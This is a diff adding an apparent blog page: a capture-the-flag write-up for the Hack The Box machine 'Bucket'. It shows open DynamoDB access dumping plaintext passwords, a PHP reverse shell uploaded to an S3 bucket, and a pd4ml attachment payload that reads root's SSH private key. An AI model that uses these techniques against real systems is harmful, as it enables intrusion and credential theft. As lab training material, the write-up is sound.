@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Bucket" /><meta property="og:locale" content="en_US" /><meta name="description" content="Machine card" /><meta property="og:description" content="Machine card" /><link rel="canonical" href="http://susanou.github.io/Writeups/posts/Bucket/" /><meta property="og:url" content="http://susanou.github.io/Writeups/posts/Bucket/" /><meta property="og:site_name" content="Writeups" /><meta property="og:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Bucket/Untitled.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-29T23:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Bucket/Untitled.png" /><meta property="twitter:title" content="Bucket" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-07-06T17:34:52+02:00","datePublished":"2020-10-29T23:00:00+01:00","description":"Machine card","headline":"Bucket","image":"http://susanou.github.io/Writeups/assets/img/HackTheBox/Bucket/Untitled.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://susanou.github.io/Writeups/posts/Bucket/"},"url":"http://susanou.github.io/Writeups/posts/Bucket/"}</script><title>Bucket | Writeups</title><link rel="apple-touch-icon" sizes="180x180" href="/Writeups/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/Writeups/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/Writeups/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/Writeups/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/Writeups/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Writeups"><meta name="application-name" content="Writeups"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/Writeups/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/Writeups/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/Writeups/assets/js/dist/post.min.js"></script> <script defer src="/Writeups/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/Writeups/" alt="avatar" class="mx-auto"> <img src="/Writeups/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/Writeups/">Writeups</a></div><div class="site-subtitle font-italic">Student by day Hacker by night</div></div><ul class="w-100"><li class="nav-item"> <a href="/Writeups/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/Writeups/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/Writeups/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/Writeups/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Writeups/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Susanou" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/337512" aria-label="htb" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cam.hochberg','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/Writeups/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/cam-hochberg/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/Writeups/"> Posts </a> </span> <span>Bucket</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bucket</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Cameron Hochberg </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Oct 29, 2020, 11:00 PM +0100" prep="on" > Oct 29, 2020 <i class="unloaded">2020-10-29T23:00:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 6, 2021, 11:34 AM -0400" prefix="Updated " > Jul 6, 2021 <i class="unloaded">2021-07-06T17:34:52+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1180 words">6 min</span></div></div><div class="post-content"><h1 id="machine-card">Machine card</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Untitled.png" alt="/assets/img/HackTheBox/Bucket/Untitled.png" /></p><h1 id="nmap-scan">nmap scan</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>sudo nmap -sS -sC -sV -p- 10.10.10.212
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 19:03 CET
+Nmap scan report for 10.10.10.212
+Host is up (0.020s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds
+</pre></table></code></div></div><p>Add the IP to your /etc/hosts</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_174538.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_174538.png" /></p><p>Let’s now check the website on port 80</p><h1 id="website">Website</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_174937.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_174937.png" /></p><p>Nothing interesting at first glance but once you see the source code, we get something interesting about the images that are supposed to be there for each post.</p><h2 id="source-code">Source code</h2><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="nt">&lt;article&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"coffee"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://s3.bucket.htb/adserver/images/bug.jpg"</span> <span class="na">alt=</span><span class="s">"Bug"</span> <span class="na">height=</span><span class="s">"160"</span> <span class="na">width=</span><span class="s">"160"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"description"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Bug Bounty and 0day Research<span class="nt">&lt;/h3&gt;</span>
+<span class="nt">&lt;span&gt;</span>march 17, 2020 | Security<span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;p&gt;</span>Customised bug bounty and new 0day feeds. Feeds can be used on TV, mobile, desktop and web applications. Collecting security feeds from 100+ different trusted sources around the world.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/article&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"articles"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;article&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"coffee"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://s3.bucket.htb/adserver/images/malware.png"</span> <span class="na">alt=</span><span class="s">"Malware"</span> <span class="na">height=</span><span class="s">"160"</span> <span class="na">width=</span><span class="s">"160"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"description"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Ransomware Alerts<span class="nt">&lt;/h3&gt;</span>
+<span class="nt">&lt;span&gt;</span>march 17, 2020 | Malware<span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;p&gt;</span>Run awareness ad campaigns on Ransomwares and other newly found malwares. Choose different types of malwares to fit for your campaign<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/article&gt;</span>
+
+<span class="nt">&lt;article&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"coffee"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://s3.bucket.htb/adserver/images/cloud.png"</span> <span class="na">alt=</span><span class="s">"cheer"</span> <span class="na">height=</span><span class="s">"160"</span> <span class="na">width=</span><span class="s">"160"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"description"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Cloud Updates<span class="nt">&lt;/h3&gt;</span>
+<span class="nt">&lt;span&gt;</span>march 17, 2020 | Cloud<span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;p&gt;</span>Stay tuned to cloud technology updates. A superior alternative to Push Notifications and SMS A2P alerts. <span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/article&gt;</span>
+</pre></table></code></div></div><p>Add the address to your /etc/hosts and let’s to a little bit of enumeration now</p><h2 id="enumeration">Enumeration</h2><p>Enumeration on the new link:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>gobuster dir -u http://s3.bucket.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://s3.bucket.htb
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/10/30 19:12:08 Starting gobuster
+===============================================================
+/health (Status: 200)
+/shell (Status: 200)
+</pre></table></code></div></div><p>Let’s check the shell part of the website.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_175414.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_175414.png" /></p><p>Gives us access to a JS shell for dynamodb. Tried using it but gave up and in the end used the aws CLI. First let’s get a list of all the tables of the DB:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+{
+    "TableNames": [
+        "users"
+    ]
+}
+</pre></table></code></div></div><p>Now let’s see what is inside of that table</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
+{
+    "Items": [
+        {
+            "password": {
+                "S": "Management@#1@#"
+            },
+            "username": {
+                "S": "Mgmt"
+            }
+        },
+        {
+            "password": {
+                "S": "Welcome123!"
+            },
+            "username": {
+                "S": "Cloudadm"
+            }
+        },
+        {
+            "password": {
+                "S": "n2vM-&lt;_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
+</pre></table></code></div></div><p>No luck connecting with any of the credentials so let’s try something else.</p><h1 id="foothold">Foothold</h1><p>Let’s first check if we can create a bucket and upload a file to that bucket</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>aws --endpoint-url=http://s3.bucket.htb s3api create-bucket --bucket mine
+aws --endpoint-url=http://s3.bucket.htb s3 ls
+2020-11-01 18:40:04 adserver
+2020-11-01 18:40:18 mine
+</pre></table></code></div></div><p>As we can see there is two buckets, one that we just created and the other that probably hosts all of the images for the website.</p><p>Let’s upload something</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>aws --endpoint-url http://s3.bucket.htb s3 cp rev.php s3://mine
+upload: ./rev.php to s3://mine/rev.php
+</pre></table></code></div></div><p>Let’s check if the file exists</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_184606.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_184606.png" /></p><p>It does and we can download it. Not what we want but that’s a start.</p><p>I got stuck on that for a bit but then I tried to upload my reverse shell to the other bucket <code class="language-plaintext highlighter-rouge">adserver</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>aws --endpoint-url http://s3.bucket.htb s3 cp rev.php s3://adserver
+upload: ./rev.php to s3://adserver/rev.php
+</pre></table></code></div></div><p>Now let’s start a nc listener and check on that file</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_185439.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_185439.png" /></p><p>We got our foothold now let’s get user on the machine</p><h1 id="getting-user">Getting user</h1><p>Let’s first look at who is on the machine:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>www-data@bucket:/$ ls /home
+ls /home
+roy
+</pre></table></code></div></div><p>We only have one user. Now I just tried for good measure the passwords that we got from the table one by one and got lucky</p><p>Roy’s password is: <code class="language-plaintext highlighter-rouge">n2vM-&lt;_K_Q:.Aa2</code>. Connect to the server using ssh and you get the user flag</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>roy@bucket:~$ ls
+project  user.txt
+roy@bucket:~$ cat user.txt
+a7.........................32
+</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="source-code-1">Source Code</h2><p>After some enumeration inside of the server, you come accross the source code of <code class="language-plaintext highlighter-rouge">index.php</code> for the website:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
+                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
+                        <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
+                        <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
+                        <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
+                        <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
+                <span class="p">]);</span>
+
+                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+                        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
+                        <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
+                        <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
+                <span class="p">));</span>
+
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
+                        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
+                <span class="p">}</span>
+                <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Here we see that it uses <code class="language-plaintext highlighter-rouge">pd4ml</code> to generate a PDF file with any item in the table <code class="language-plaintext highlighter-rouge">alerts</code> and the title <code class="language-plaintext highlighter-rouge">Ransomware</code>. After going through the documentation, I got this interesting part for attachments in pdf files: <a href="https://pd4ml.com/cookbook/pdf-attachments.htm">https://pd4ml.com/cookbook/pdf-attachments.htm</a></p><p>Looking at the last example, it looks like when can add inline file to the attachment.</p><p>So now we need to do 3 thing:</p><ul><li>Create the <code class="language-plaintext highlighter-rouge">alert</code> table<li>add our payload as an item within that table<li>get it to generate the pdf file with a POST request</ul><p><em>NB: ****you can recover the flag using this method but also the <code class="language-plaintext highlighter-rouge">id_rs</code></em> <em>to connect via SSH which I will show down here</em></p><p>From you own machine, reate the table with the following command:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">aws</span> <span class="n">dynamodb</span> <span class="n">create</span><span class="o">-</span><span class="n">table</span> <span class="o">--</span><span class="n">table</span><span class="o">-</span><span class="n">name</span> <span class="n">alerts</span> <span class="o">--</span><span class="n">attribute</span><span class="o">-</span><span class="n">definitions</span> <span class="nc">AttributeName</span><span class="o">=</span><span class="n">title</span><span class="p">,</span><span class="nc">AttributeType</span><span class="o">=</span><span class="nc">S</span> <span class="o">--</span><span class="n">key</span><span class="o">-</span><span class="n">schema</span> <span class="nc">AttributeName</span><span class="o">=</span><span class="n">title</span><span class="p">,</span><span class="nc">KeyType</span><span class="o">=</span><span class="no">HASH</span> <span class="o">--</span><span class="n">provisioned</span><span class="o">-</span><span class="n">throughput</span> <span class="nc">ReadCapacityUnits</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span><span class="nc">WriteCapacityUnits</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">endpoint</span><span class="o">-</span><span class="n">url</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="n">s3</span><span class="mf">.</span><span class="n">bucket</span><span class="mf">.</span><span class="n">htb</span>
+</pre></table></code></div></div><p>Create an item with our payload</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">aws</span> <span class="n">dynamodb</span> <span class="n">put</span><span class="o">-</span><span class="n">item</span> <span class="o">--</span><span class="n">table</span><span class="o">-</span><span class="n">name</span> <span class="n">alerts</span> <span class="o">--</span><span class="n">item</span> <span class="s1">'{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;"}}'</span> <span class="o">--</span><span class="n">endpoint</span><span class="o">-</span><span class="n">url</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="n">s3</span><span class="mf">.</span><span class="n">bucket</span><span class="mf">.</span><span class="n">htb</span>
+</pre></table></code></div></div><p>On the bucket machine create the POST request</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">curl</span> <span class="o">-</span><span class="nc">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s2">"action=get_alerts"</span> <span class="n">http</span><span class="o">://</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">8000</span><span class="o">/</span> <span class="o">-</span><span class="n">v</span>
+</pre></table></code></div></div><p>If it looks like it took some time before getting an answer, that means you have created the pdf file and you can copy it onto your machine:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">scp</span> <span class="n">roy</span><span class="o">@</span><span class="n">bucket</span><span class="mf">.</span><span class="n">htb</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">bucket</span><span class="o">-</span><span class="n">app</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">result</span><span class="mf">.</span><span class="n">pdf</span> <span class="o">~/</span><span class="nc">Github</span><span class="o">/</span><span class="nc">CTFstuff</span><span class="o">/</span><span class="nc">HackTheBox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="nc">Buckets</span><span class="o">/</span>
+</pre></table></code></div></div><p>download the file in the pdf (click on the icon):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Bucket/Screenshot_20201101_201642.png" alt="/assets/img/HackTheBox/Bucket/Screenshot_20201101_201642.png" /></p><p>change the permission and connect with ssh</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nb">chmod </span>600 id_rsa
+ssh <span class="nt">-i</span> id_rsa root@bucket.htb
+root@bucket:~# <span class="nb">ls
+</span>backups  docker-compose.yml  files  restore.php  restore.sh  root.txt  snap  start.sh  sync.sh
+root@bucket:~# <span class="nb">cat </span>root.txt
+9fca4..................................202079ce3
+</pre></table></code></div></div><p>WE GOT THE FLAG!!!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/Writeups/categories/hack-the-box/'>Hack The Box</a>, <a href='/Writeups/categories/active/'>Active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/Writeups/tags/aws/" class="post-tag no-text-decoration" >AWS</a> <a href="/Writeups/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/Writeups/tags/web-shell/" class="post-tag no-text-decoration" >web-shell</a> <a href="/Writeups/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/Writeups/tags/file-upload/" class="post-tag no-text-decoration" >file upload</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bucket - Writeups&url=http://susanou.github.io/Writeups/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bucket - Writeups&u=http://susanou.github.io/Writeups/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a 